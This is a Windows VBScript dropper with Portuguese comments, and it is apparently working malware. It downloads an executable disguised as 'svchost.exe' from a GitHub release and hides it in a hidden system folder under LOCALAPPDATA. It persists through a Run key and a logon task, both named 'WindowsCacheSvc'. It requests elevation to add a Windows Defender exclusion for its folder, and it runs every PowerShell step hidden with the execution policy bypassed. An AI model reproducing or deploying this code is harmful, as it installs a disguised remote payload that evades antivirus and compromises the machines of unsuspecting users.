' installer.vbs — Auto-instalador com retry via Registro do Windows.
'
' Regra principal (sempre, antes de qualquer coisa):
'   - Se já existe svchost.exe NA PASTA ou RODANDO no sistema → sai na hora.
'     Não baixa, não move, não registra no Run, não dispara nada.
'   - Só se NÃO existir nada é que ele faz o resto (baixa, move, roda).
'
' Persistência (quando instala):
'   - O Run ganha "WindowsCacheSvc" apontando pro installer.vbs (nunca remove).
'   - Nunca troca pro svchost.exe.

Option Explicit

Dim shell, fso, localAppData, destino, exeUrl, tmpExe
Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
Dim vbsPath, psKill, tentativasMove
Dim regRun, regValorNome, regInstalador
Dim psTask, taskName
Dim pastaDefender, psExclusao, cmdElevar, psChecker
Dim psCheckProc, regAtual

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' =====================================================================
' CONFIGURAÇÕES
' =====================================================================
exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"

localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

destino    = localAppData & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"
tmpExe     = destino & "\svchost_novo.exe"

regRun        = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValorNome  = "WindowsCacheSvc"
taskName      = "WindowsCacheSvc"

vbsPath = WScript.ScriptFullName
regInstalador = "wscript.exe //B """ & vbsPath & """"

pastaDefender = destino

' =====================================================================
' PASSO 0 — REGRA PRINCIPAL: já tem svchost? Então sai agora.
' =====================================================================
' Checa DUAS coisas:
'   a) O arquivo svchost.exe já existe na pasta oculta?
'   b) Algum processo svchost.exe está rodando daquele arquivo?
'
' Se QUALQUER uma for verdadeira → WScript.Quit 0 (sai sem fazer nada).
'
' Só continua se não existir nem o arquivo nem o processo.
' =====================================================================

' ---- (a) arquivo existe? ----
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    tamArquivo = 0
    tamArquivo = fso.GetFile(destinoExe).Size
    On Error Goto 0

    If tamArquivo >= 1048576 Then
        ' Arquivo existe e tem tamanho ok. Antes de sair, garante que ele
        ' está no Run apontando pro VBS (pra auto-recuperação continuar).
        On Error Resume Next
        shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
        On Error Goto 0

        ' Confere se está rodando. Se NÃO estiver, dispara ele antes de sair.
        psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                      "$alvo = '" & destinoExe & "'.ToLower(); " & _
                      "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
                      "if ($procs.Count -eq 0) { exit 1 }; " & _
                      "$achou = $false; $semPath = $false; " & _
                      "foreach ($p in $procs) { " & _
                      "  try { " & _
                      "    $exe = $p.Path; " & _
                      "    if (-not $exe) { $semPath = $true; continue } " & _
                      "    if ($exe.ToLower() -eq $alvo) { $achou = $true; break } " & _
                      "  } catch { $semPath = $true } " & _
                      "}; " & _
                      "if ($achou) { exit 0 }; " & _
                      "if ($semPath) { exit 0 }; " & _
                      "exit 1" & _
                      """"

        rc = 1
        On Error Resume Next
        rc = shell.Run(psCheckProc, 0, True)
        On Error Goto 0

        If rc <> 0 Then
            ' Arquivo existe mas não está rodando → só dispara, sem baixar.
            On Error Resume Next
            shell.Run """" & destinoExe & """", 0, False
            On Error Goto 0
        End If

        ' Sai — não baixa nada.
        WScript.Quit 0
    End If
End If

' ---- (b) algum svchost rodando de qualquer lugar? ----
' Se por acaso a pasta não tem o arquivo, mas existe um processo
' svchost.exe rodando de outro canto (ex: realocado), também não faz nada.
psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
              "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
              "if ($procs.Count -gt 0) { exit 0 } else { exit 1 }" & _
              """"

rc = 1
On Error Resume Next
rc = shell.Run(psCheckProc, 0, True)
On Error Goto 0

If rc = 0 Then
    ' Existe svchost.exe rodando em algum lugar → sai sem instalar nada.
    WScript.Quit 0
End If

' =====================================================================
' A PARTIR DAQUI: não existe svchost.exe (nem arquivo nem processo).
' Fluxo de instalação normal.
' =====================================================================

' =====================================================================
' PASSO 1 — Garante a entrada no Run (VBS) e cria a pasta
' =====================================================================
regAtual = ""
On Error Resume Next
regAtual = shell.RegRead(regRun & "\" & regValorNome)
On Error Goto 0

If regAtual <> regInstalador Then
    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0
End If

On Error Resume Next
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True
On Error Goto 0

' =====================================================================
' PASSO 2 — Exclusão no Windows Defender (UAC só na 1ª vez)
' =====================================================================
psChecker = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
            "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
            "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
            "$achou = $false; " & _
            "foreach ($e in $excl) { " & _
            "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
            "}; " & _
            "if ($achou) { exit 0 } else { exit 1 }" & _
            """"

rc = 1
On Error Resume Next
rc = shell.Run(psChecker, 0, True)
On Error Goto 0

If rc <> 0 Then
    psExclusao = "$p = '" & pastaDefender & "'; " & _
                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue"
    psExclusao = Replace(psExclusao, "'", "''")

    cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                "Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden " & _
                "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','" & psExclusao & "'" & _
                """"

    On Error Resume Next
    shell.Run cmdElevar, 0, True
    On Error Goto 0
End If

' =====================================================================
' PASSO 3 — Baixa svchost.exe do GitHub
' =====================================================================
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
On Error Resume Next
rc = shell.Run(cmdBaixar, 0, True)
On Error Goto 0

tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 120
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

tamArquivo = 0
On Error Resume Next
If fso.FileExists(tmpExe) Then
    tamArquivo = fso.GetFile(tmpExe).Size
End If
On Error Goto 0

' --- Falhou? Sai silencioso. Run já está com o VBS. ---
If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
    On Error Resume Next
    fso.DeleteFile tmpExe, True
    On Error Goto 0
    WScript.Quit 0
End If

' =====================================================================
' PASSO 4 — Move pra destino final (com retry)
' =====================================================================
tentativasMove = 0
Do While tentativasMove < 30
    On Error Resume Next
    If fso.FileExists(destinoExe) Then
        fso.DeleteFile destinoExe, True
    End If
    Err.Clear
    fso.MoveFile tmpExe, destinoExe
    If Err.Number = 0 Then Exit Do
    Err.Clear
    On Error Goto 0
    WScript.Sleep 500
    tentativasMove = tentativasMove + 1
Loop

If tentativasMove >= 30 Then
    WScript.Quit 0
End If

' =====================================================================
' PASSO 5 — Roda o agente
' =====================================================================
On Error Resume Next
shell.Run """" & destinoExe & """", 0, False
On Error Goto 0

' =====================================================================
' PASSO 6 — Tarefa Agendada como backup (opcional)
' =====================================================================
psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$nome = '" & taskName & "'; " & _
         "$exe  = '" & destinoExe & "'; " & _
         "try { " & _
         "  $a = New-ScheduledTaskAction -Execute $exe; " & _
         "  $t = New-ScheduledTaskTrigger -AtLogOn; " & _
         "  $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; " & _
         "  Register-ScheduledTask -TaskName $nome -Action $a -Trigger $t -Settings $s -Force -ErrorAction Stop | Out-Null; " & _
         "  exit 0 " & _
         "} catch { exit 1 }"""
On Error Resume Next
shell.Run psTask, 0, True
On Error Goto 0

' =====================================================================
' PASSO 7 — Auto-deleta o .vbs (COMENTADO = auto-recuperação)
' =====================================================================
' Como está comentado, o VBS fica no disco e roda a cada logon.
' shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
